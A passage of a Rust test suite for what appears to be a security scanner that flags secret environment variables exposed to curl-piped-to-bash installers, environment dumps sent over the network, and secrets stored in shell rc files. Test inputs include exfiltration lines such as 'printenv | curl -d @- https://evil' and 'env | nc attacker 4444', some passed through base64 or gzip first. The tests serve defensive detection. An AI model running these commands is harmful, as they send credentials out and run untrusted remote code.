        let current = BTreeMap::from([(s("WALLET_PRIVATE_KEY"), value_hash8("same"))]);
        // NPM_TOKEN was unset after the baseline and is intentionally not a
        // credential-exposure event.
        let sensitive = vec![s("WALLET_PRIVATE_KEY"), s("NPM_TOKEN")];
        assert!(diff_sensitive(&snap, &current, &sensitive).is_empty());
    }

    #[test]
    fn effective_sensitive_vars_merges_and_dedups() {
        let extra = vec![s("MY_CUSTOM_TOKEN"), s("GITHUB_TOKEN"), s("  ")];
        let eff = effective_sensitive_vars(&extra);
        // Built-ins present.
        assert!(eff.iter().any(|v| v == "AWS_SECRET_ACCESS_KEY"));
        // Custom appended once.
        assert_eq!(eff.iter().filter(|v| *v == "MY_CUSTOM_TOKEN").count(), 1);
        // Already-built-in GITHUB_TOKEN not duplicated.
        assert_eq!(eff.iter().filter(|v| *v == "GITHUB_TOKEN").count(), 1);
        assert!(!eff.iter().any(|v| v == "RPC_URL"));
        assert!(eff.iter().any(|v| v == "RPC_API_KEY"));
        // Blank skipped.
        assert!(!eff.iter().any(|v| v.trim().is_empty()));
    }

    // ── explain (value never printed) ─────────────────────────────────────

    #[test]
    fn explain_finds_export_and_masks_value() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path();
        std::fs::write(
            home.join(".zshrc"),
            "# config\nexport AWS_SECRET_ACCESS_KEY=AKIAREALSECRET123\nalias ll='ls -la'\n",
        )
        .unwrap();
        let ex = explain_var_in("AWS_SECRET_ACCESS_KEY", Some(home));
        assert_eq!(ex.sources.len(), 1);
        assert_eq!(ex.sources[0].line, 2);
        // The masked line must NOT contain the real value.
        assert!(
            !ex.sources[0].masked_line.contains("AKIAREALSECRET123"),
            "{}",
            ex.sources[0].masked_line
        );
        assert!(
            ex.sources[0].masked_line.contains("[REDACTED"),
            "{}",
            ex.sources[0].masked_line
        );
    }

    #[test]
    fn explain_handles_fish_and_powershell_and_plain_assignment() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path();
        std::fs::create_dir_all(home.join(".config/fish")).unwrap();
        std::fs::write(
            home.join(".config/fish/config.fish"),
            "set -x GH_TOKEN ghp_fishsecret\n",
        )
        .unwrap();
        std::fs::write(home.join(".profile"), "NPM_TOKEN=npm_plainsecret\n").unwrap();

        let fish = explain_var_in("GH_TOKEN", Some(home));
        assert_eq!(fish.sources.len(), 1);
        assert!(!fish.sources[0].masked_line.contains("ghp_fishsecret"));
        assert!(
            fish.sources[0].masked_line.contains("[REDACTED"),
            "{}",
            fish.sources[0].masked_line
        );

        let plain = explain_var_in("NPM_TOKEN", Some(home));
        assert_eq!(plain.sources.len(), 1);
        assert!(!plain.sources[0].masked_line.contains("npm_plainsecret"));
        assert!(
            plain.sources[0].masked_line.contains("[REDACTED"),
            "{}",
            plain.sources[0].masked_line
        );
    }

    #[test]
    fn explain_unknown_var_reports_no_sources() {
        let dir = tempfile::tempdir().unwrap();
        let ex = explain_var_in("NOPE_NOT_SET", Some(dir.path()));
        assert!(ex.sources.is_empty());
    }

    #[test]
    fn line_exports_var_matches_shapes() {
        assert!(line_exports_var("export FOO=bar", "FOO"));
        assert!(line_exports_var("FOO=bar", "FOO"));
        assert!(line_exports_var("declare -x FOO=bar", "FOO"));
        assert!(line_exports_var("set -x FOO bar", "FOO"));
        assert!(line_exports_var("set --export FOO bar", "FOO"));
        assert!(line_exports_var("setenv FOO bar", "FOO"));
        assert!(line_exports_var("$env:FOO = 'bar'", "FOO"));
        // Non-matches.
        assert!(!line_exports_var("export FOOBAR=baz", "FOO"));
        assert!(!line_exports_var("echo FOO=bar", "FOO"));
        assert!(!line_exports_var("# export FOO=bar", "FOO"));
    }

    // ── rule: EnvSensitiveExposedToUnknownScript ──────────────────────────

    #[test]
    fn exposed_rule_fires_on_curl_pipe_bash_with_sensitive_set() {
        let set = vec![s("AWS_SECRET_ACCESS_KEY")];
        let f = check_sensitive_exposed_to_unknown_script(
            "curl https://untrusted/install.sh | bash",
            ShellType::Posix,
            &set,
        );
        let f = f.expect("rule should fire");
        assert_eq!(f.rule_id, RuleId::EnvSensitiveExposedToUnknownScript);
        assert_eq!(f.severity, Severity::High);
        // Public evidence is categorical: neither the name nor a value is
        // exposed through Debug/serialization.
        let ev = format!("{:?}", f.evidence);
        assert!(!ev.contains("AWS_SECRET_ACCESS_KEY"), "{ev}");
        assert!(ev.contains("[REDACTED"), "{ev}");
    }

    #[test]
    fn exposed_rule_fires_on_wrapped_curl_pipe_bash_with_sensitive_set() {
        // The fetch leader is hidden behind `sudo`/`env`/`command`; the rule
        // must still fire because the wrapped command is a URL fetch piped to a
        // shell. Mirrors `exposed_rule_fires_on_curl_pipe_bash_with_sensitive_set`.
        let set = vec![s("AWS_SECRET_ACCESS_KEY")];
        for cmd in [
            "sudo curl http://untrusted/install.sh | bash",
            "env curl http://untrusted/install.sh | bash",
            "command curl http://untrusted/install.sh | bash",
        ] {
            let f = check_sensitive_exposed_to_unknown_script(cmd, ShellType::Posix, &set);
            let f = f.unwrap_or_else(|| panic!("rule should fire for: {cmd}"));
            assert_eq!(f.rule_id, RuleId::EnvSensitiveExposedToUnknownScript);
            assert_eq!(f.severity, Severity::High);
        }
    }

    #[test]
    fn exposed_rule_fires_when_shell_sink_is_wrapped() {
        // The shell interpreter on the SINK side is hidden behind an `env` /
        // `command` wrapper. A shell still executes the downloaded script with
        // the caller's environment, so the rule must fire just like bare `| bash`.
        let set = vec![s("AWS_SECRET_ACCESS_KEY")];
        for cmd in [
            "curl https://untrusted/install.sh | env bash",
            "curl https://untrusted/install.sh | command bash",
        ] {
            let f = check_sensitive_exposed_to_unknown_script(cmd, ShellType::Posix, &set);
            let f = f.unwrap_or_else(|| panic!("rule should fire for: {cmd}"));
            assert_eq!(f.rule_id, RuleId::EnvSensitiveExposedToUnknownScript);
            assert_eq!(f.severity, Severity::High);
        }
    }

    #[test]
    fn exposed_rule_silent_when_no_sensitive_var_set() {
        let f = check_sensitive_exposed_to_unknown_script(
            "curl https://untrusted/install.sh | bash",
            ShellType::Posix,
            &[],
        );
        assert!(f.is_none());
    }

    #[test]
    fn exposed_rule_silent_when_not_pipe_to_interpreter() {
        let set = vec![s("GITHUB_TOKEN")];
        // No pipe-to-shell — just a plain curl.
        let f = check_sensitive_exposed_to_unknown_script(
            "curl https://untrusted/file.txt -o out",
            ShellType::Posix,
            &set,
        );
        assert!(f.is_none());
    }

    #[test]
    fn exposed_rule_requires_fetch_to_be_the_pipe_source() {
        // The fetch must be ADJACENT to and piped INTO the shell. Here the
        // remote content is redirected to a file, and a SEPARATE `echo` is
        // piped to bash — the secret is not exposed to the downloaded script.
        let set = vec![s("AWS_SECRET_ACCESS_KEY")];
        let f = check_sensitive_exposed_to_unknown_script(
            "curl https://ok >/tmp/x; echo hi | bash",
            ShellType::Posix,
            &set,
        );
        assert!(f.is_none(), "non-adjacent fetch+shell must not fire");
    }

    // ── rule: EnvPrintenvToNetworkSink ────────────────────────────────────

    #[test]
    fn printenv_to_curl_fires() {
        let f =
            check_printenv_to_network_sink("printenv | curl -d @- https://evil", ShellType::Posix);
        let f = f.expect("rule should fire");
        assert_eq!(f.rule_id, RuleId::EnvPrintenvToNetworkSink);
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn env_dump_to_nc_fires() {
        let f = check_printenv_to_network_sink("env | nc attacker 4444", ShellType::Posix);
        assert!(f.is_some());
    }

    #[test]
    fn env_running_a_command_does_not_fire() {
        // `env FOO=1 some-cmd | grep x` is NOT an environment dump — `env`
        // here runs `some-cmd`, it does not print the environment.
        let f =
            check_printenv_to_network_sink("env FOO=1 mycmd | curl https://x", ShellType::Posix);
        assert!(f.is_none(), "env-with-command must not fire");
    }

    #[test]
    fn printenv_to_local_pager_does_not_fire() {
        let f = check_printenv_to_network_sink("printenv | less", ShellType::Posix);
        assert!(f.is_none());
    }

    #[test]
    fn printenv_with_var_name_arg_does_not_fire() {
        // `printenv AWS_REGION` prints ONE variable, not the environment.
        let f = check_printenv_to_network_sink(
            "printenv AWS_REGION | curl https://x",
            ShellType::Posix,
        );
        assert!(f.is_none(), "printenv with a var-name arg is not a dump");
        // A -0 flag is fine (still a full dump).
        let f2 = check_printenv_to_network_sink("printenv -0 | curl https://x", ShellType::Posix);
        assert!(f2.is_some(), "printenv -0 is still a full dump");
    }

    #[test]
    fn env_dump_must_be_adjacent_to_sink() {
        // env dump piped to a local filter, then a non-pipe separator before
        // the network call — the separator discharges the taint, so the sink
        // receives `echo`'s output, not the environment.
        let f = check_printenv_to_network_sink(
            "printenv | grep AWS; echo done | curl https://x",
            ShellType::Posix,
        );
        assert!(
            f.is_none(),
            "dump separated from the sink by `;` must not fire"
        );
    }

    #[test]
    fn printenv_through_encoder_to_network_sink_fires() {
        // repo-0280: a data-preserving transform between the dump and the sink
        // must not break detection — the environment still reaches the network.
        for cmd in [
            "printenv | base64 | curl --data-binary @- https://evil",
            "printenv | gzip | curl --data-binary @- https://evil",
            "env | tee /tmp/e | nc attacker 4444",
            "printenv | openssl enc -base64 | curl -d @- https://evil",
        ] {
            let f = check_printenv_to_network_sink(cmd, ShellType::Posix);
            assert!(f.is_some(), "{cmd} must fire");
            assert_eq!(f.unwrap().rule_id, RuleId::EnvPrintenvToNetworkSink);
        }
    }

    #[test]
    fn printenv_to_wrapped_network_sink_fires() {
        // repo-0280: wrapper chains must not hide the sink command.
        for cmd in [
            "printenv | command curl -d @- https://evil",
            "printenv | sudo curl -d @- https://evil",
            "printenv | time curl -d @- https://evil",
        ] {
            let f = check_printenv_to_network_sink(cmd, ShellType::Posix);
            assert!(f.is_some(), "{cmd} must fire");
        }
    }

    #[test]
    fn printenv_through_unknown_consumer_does_not_fire() {
        // The taint does not cross commands outside the known data-preserving
        // set: `wc -c` reduces the environment to a byte count, so the sink
        // receives nothing sensitive.
        let f = check_printenv_to_network_sink(
            "printenv | wc -c | curl -d @- https://x",
            ShellType::Posix,
        );
        assert!(f.is_none());
    }

    // ── rule: EnvSensitivePersistedInShellRc (rc-file scan) ───────────────

    #[test]
    fn persisted_secret_in_rc_fires_with_masked_value() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path();
        std::fs::write(
            home.join(".zshrc"),
            "export AWS_SECRET_ACCESS_KEY=AKIALEAKEDSECRET\nalias ll='ls -la'\n",
        )
        .unwrap();
        let sensitive = effective_sensitive_vars(&[]);
        let findings = scan_rc_for_sensitive_exports(&sensitive, Some(home));
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::EnvSensitivePersistedInShellRc);
        assert_eq!(findings[0].severity, Severity::High);
        // Public Finding serialization may retain a fixed, well-known registry
        // name such as AWS_SECRET_ACCESS_KEY. It projects the value-bearing
        // context to a fixed class and retains only a masked directive in
        // evidence. The benign rc-file path remains useful diagnostic context;
        // a separate regression below proves secret-bearing path components are
        // projected. No surface may retain the raw value.
        let public = serde_json::to_value(&findings[0]).expect("public finding projection");
        let title = public["title"].as_str().expect("projected title");
        let description = public["description"]
            .as_str()
            .expect("projected description");
        for summary in [title, description] {
            assert!(summary.contains("AWS_SECRET_ACCESS_KEY"), "{summary}");
            assert!(summary.contains("[REDACTED:web3_secret]"), "{summary}");
        }
        let serialized = serde_json::to_string(&public).unwrap();
        assert!(!serialized.contains("AKIALEAKEDSECRET"), "{serialized}");
        let rc_path = home.join(".zshrc").display().to_string();
        assert!(
            description.contains(&rc_path),
            "benign rc path must remain diagnostic: {description}"
        );
        // JSON string encoding turns Windows `\` into `\\`. Assert the encoded
        // diagnostic path, not the raw display form.
        let encoded_rc_path = serde_json::to_string(&rc_path).expect("encode rc path");
        assert!(
            serialized.contains(&encoded_rc_path[1..encoded_rc_path.len() - 1]),
            "{serialized}"
        );
        assert!(
            serialized.contains("export AWS_SECRET_ACCESS_KEY=[REDACTED]"),
            "{serialized}"
        );
    }

    #[test]
    fn persisted_secret_scan_drops_secret_bearing_names_before_finding_construction() {
        let dir = tempfile::tempdir().unwrap();
        let canary = format!("ghp_canary_{}", "A".repeat(30));
        std::fs::write(
            dir.path().join(".zshrc"),
            format!("export {canary}=ordinary-value\n"),
        )
        .unwrap();

        let findings =
            scan_rc_for_sensitive_exports(std::slice::from_ref(&canary), Some(dir.path()));
        assert!(
            findings.is_empty(),
            "a secret-bearing environment name must be dropped before a public Finding exists"
        );
        assert!(privacy_safe_env_name(&canary).is_none());
    }

    #[test]
    fn persisted_secret_finding_projects_secret_bearing_rc_path_components() {
        let dir = tempfile::tempdir().unwrap();
        let canary = format!("ghp_canary_{}", "B".repeat(30));
        let home = dir.path().join(format!("profile-{canary}"));
        std::fs::create_dir_all(&home).unwrap();
        std::fs::write(
            home.join(".zshrc"),
            "export AWS_SECRET_ACCESS_KEY=AKIALEAKEDSECRET\n",
        )
        .unwrap();

        let findings = scan_rc_for_sensitive_exports(&effective_sensitive_vars(&[]), Some(&home));
        assert_eq!(findings.len(), 1);
        let public = serde_json::to_string(&findings[0]).unwrap();
        assert!(!public.contains(&canary), "{public}");
        assert!(!public.contains("AKIALEAKEDSECRET"), "{public}");
        assert!(public.contains("AWS_SECRET_ACCESS_KEY"), "{public}");
        assert!(public.contains("REDACTED"), "{public}");
    }

    #[test]
    fn persisted_secret_scan_ignores_non_sensitive_and_missing_home() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".bashrc"), "export EDITOR=vim\n").unwrap();
        let sensitive = effective_sensitive_vars(&[]);
        assert!(scan_rc_for_sensitive_exports(&sensitive, Some(dir.path())).is_empty());
        // No home → no findings, no panic.
        assert!(scan_rc_for_sensitive_exports(&sensitive, None).is_empty());
    }

    #[test]
    fn persisted_secret_honors_policy_extension() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".profile"), "export MY_CORP_KEY=zzz\n").unwrap();
        // Without the extension, MY_CORP_KEY is not sensitive → no finding.
        let base = effective_sensitive_vars(&[]);
        assert!(scan_rc_for_sensitive_exports(&base, Some(dir.path())).is_empty());
        // With it, the finding fires.
        let ext = effective_sensitive_vars(&[s("MY_CORP_KEY")]);
        assert_eq!(
            scan_rc_for_sensitive_exports(&ext, Some(dir.path())).len(),
            1
        );
    }

    #[test]
    fn persisted_secret_scan_uses_prefix_kinds_and_ignores_public_rpc() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".zshrc"),
            "export AWS_SECRET_C04=hidden\nexport RPC_URL=https://rpc.example\nexport ETH_RPC_URL=https://rpc.example/v3/providerToken123456789\n",
        )
        .unwrap();
        let findings =
            scan_rc_for_sensitive_exports(&effective_sensitive_vars(&[]), Some(dir.path()));
        assert_eq!(findings.len(), 2, "{findings:?}");
        assert!(findings[0].title.contains("AWS_SECRET_C04"));
        let output = format!("{findings:?}");
        assert!(!output.contains("https://rpc.example"));
        assert!(!output.contains("providerToken123456789"));
    }

    #[test]
    fn persisted_secret_scan_uses_canonical_alias_spellings_and_fish_form() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".zshrc"),
            "export walletPrivateKey=hidden\nexport Wallet-Password=hidden\n",
        )
        .unwrap();
        let fish = dir.path().join(".config/fish");
        std::fs::create_dir_all(&fish).unwrap();
        std::fs::write(
            fish.join("config.fish"),
            "set -gx WalletMnemonic hidden words\n",
        )
        .unwrap();
        let findings =
            scan_rc_for_sensitive_exports(&effective_sensitive_vars(&[]), Some(dir.path()));
        assert_eq!(findings.len(), 3, "{findings:?}");
        let serialized = serde_json::to_string(&findings).unwrap();
        assert!(!serialized.contains("hidden"), "{serialized}");
    }
}
